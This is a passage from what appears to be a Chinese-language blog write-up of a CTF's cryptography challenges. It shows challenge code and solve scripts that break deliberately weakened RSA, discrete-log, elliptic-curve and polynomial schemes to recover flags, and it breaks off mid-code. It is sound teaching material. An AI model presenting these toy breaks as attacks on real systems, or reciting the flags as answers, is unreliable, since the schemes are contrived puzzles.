class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure><p>题目大意：10轮 每次给一条未知参数椭圆曲线上的4个点 要求还原参数</p><p>我的第一思路是sage能直接求吗? 把同余写成等式刚好四个方程四个未知数 肯定是能解的 :(<br>由于没有环境也不知道能不能成 瞄了眼师傅的WP 提示用类似LCG的方法<br>那么首先还原p<br>分别取1,2 1,3 1,4 2,3 四组等式<br>每组内作差消去b 移项得到a的表达式<br>再两组联立消掉a 这样得到两组同余0 modp的方程<br>求gcd即可得到p<br>然后还原a,b就简单了</p><h2 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure><p>题目的意思是生成了一个127次多项式 我们可以给一个<code>&lt;=2^32</code>的数作为x<br>能知道f(x)的值 反推所有系数</p><p>其实题目那个check大小的限制已经很明确的提示思路了 我们选择-2^32也可以还原<br>从最高位开始 除以对应幂次后绝对值向上取整即可还原</p><h2 id="Fi1nd-th3-x’"><a href="#Fi1nd-th3-x’" class="headerlink" title="Fi1nd_th3_x’"></a>Fi1nd_th3_x’</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm 怎么说呢 我就随便试了试 (想到flag不经过padding还是挺小的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,dP,q*r)))</span><br></pre></td></tr></table></figure><p>然后就出了…<br><code>SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;</code></p><p>回到题目本身的考点: 不互素情况下的CRT<br>dP,dQ,dR 分别可以得到</p><p><img src="https://s2.loli.net/2023/12/03/dTgqRexIQvDsPkJ.png" alt="H~7~A___X_G80H_J7CW_K1L.png"></p><p><code>from sympy.ntheory.modular import crt</code> 这个crt可以解决不互素的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([q*r,p*r,p*q],[<span class="built_in">pow</span>(c,dP,n),<span class="built_in">pow</span>(c,dQ,n),<span class="built_in">pow</span>(c,dR,n)])[<span class="number">0</span>]%n))</span><br></pre></td></tr></table></figure><h2 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>由题目p,q,r的生成方式知: p-1,q-1,r-1均光滑<br>注意到p,q,r均为素数 那么我们分别对mod p,q,r求dlp后crt组合起来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">g = <span class="number">3</span></span><br><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line">n = p*q*r</span><br><span class="line"></span><br><span class="line">mp = discrete_log(mod(y,p),mod(g,p))</span><br><span class="line">mq = discrete_log(mod(y,q),mod(g,q))</span><br><span class="line">mr = discrete_log(mod(y,r),mod(g,r))</span><br><span class="line"><span class="built_in">print</span>(CRT_list([mp,mq,mr],[p,q,r]))</span><br><span class="line">m = <span class="number">10611516989504525712597368786937786671609696614143113241754963687897074368833799765059908989</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>az… 学到了 (<a href="/Complex-RSA/" title="Complex RSA">Complex-RSA</a>)<br>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>在复数域上分解N 遍历其因子就能得到p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,e</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> e])</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">32</span></span><br><span class="line">flag = pad(flag,<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LongArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [bytes_to_long(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BytesArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [long_to_bytes(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a[i%<span class="built_in">len</span>(a)] ^^ b[i%<span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ArrayXor</span>(<span class="params">a:<span class="built_in">list</span>,b:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [xor(a[i],b) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scissors</span>(<span class="params">flag:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="built_in">len</span>(flag)//<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">m: <span class="built_in">bytes</span>, bits: <span class="built_in">int</span>, level: <span class="built_in">int</span></span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    M = random_matrix(Zmod(p), LEN).matrix_from_rows_and_columns(<span class="built_in">range</span>(LEN), <span class="built_in">range</span>(LEN-level))</span><br><span class="line">    c = vector(GF(p), m) * M</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;p&quot;</span>: p, <span class="string">&quot;M&quot;</span>: M.<span class="built_in">list</span>(), <span class="string">&quot;c&quot;</span>: c.<span class="built_in">list</span>()&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">groebner_challenge</span>(<span class="params">m,e</span>):</span><br><span class="line">    p = getPrime(<span 